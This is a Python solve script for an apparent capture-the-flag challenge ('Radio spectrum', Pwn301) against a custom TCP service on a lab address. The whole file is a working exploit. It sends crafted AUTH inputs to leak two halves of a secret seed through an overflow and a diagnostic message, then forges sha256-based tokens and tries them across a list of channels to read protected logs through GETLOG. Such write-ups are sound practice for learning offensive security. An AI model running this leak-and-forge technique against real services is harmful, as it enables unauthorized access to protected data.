#!/usr/bin/env python3
# Radio spectrum (Pwn301) — foothold on the custom TCP "spectrum desk" service.
# The service answers ONE AUTH per connection and the seed is FIXED, so we leak each half
# on its own fresh connection, then try GETLOG (each attempt on a fresh connection too).
# token = sha256(seed + channel)[:16]. Run manually: python3 solve.py
import socket, hashlib, re

HOST, PORT = "10.10.10.31", 8800
CHANNELS = ["ops", "live", "log", "main", "general", "spectrum", "radio"]

def recv(s, t=1.5):
    s.settimeout(t); b = b""
    try:
        while True:
            c = s.recv(4096)
            if not c: break
            b += c
    except socket.timeout:
        pass
    return b

def ask(payload):
    s = socket.create_connection((HOST, PORT), timeout=6)
    recv(s)                      # drain banner
    s.sendall(payload + b"\n")
    r = recv(s)
    s.close()
    return r

def hex8(b):
    m = re.search(rb"[0-9a-fA-F]{8}", b)
    return m.group(0).decode().lower() if m else None

def main():
    left  = hex8(ask(b"AUTH " + b"A"*16))   # long name -> left overflow
    right = hex8(ask(b"AUTH A?"))            # short name ending in ? -> right diag
    print(f"[seed halves] left={left} right={right}")
    if not (left and right):
        print("!! leak failed — paste raw output"); return
    seed = left + right
    print(f"[seed] {seed}")

    def tok(seedpart, ch):
        return hashlib.sha256(seedpart + ch.encode()).hexdigest()[:16]
    variants = [
        ("seedhex+ch",   lambda ch: tok(seed.encode(), ch)),
        ("seedbytes+ch", lambda ch: tok(bytes.fromhex(seed), ch)),
    ]
    for ch in CHANNELS:
        for name, fn in variants:
            token = fn(ch)
            resp = ask(f"GETLOG {ch} {token}".encode())
            txt = resp.decode(errors="replace").strip()
            print(f"[GETLOG {ch} ({name}) {token}] -> {txt!r}")
            if txt and not re.search(r"(bad|invalid|deny|denied|error|wrong|no such|unknown|fail)", txt, re.I):
                print(f"\n>>> HIT channel={ch} variant={name}\n{txt}\n")

if __name__ == "__main__":
    main()
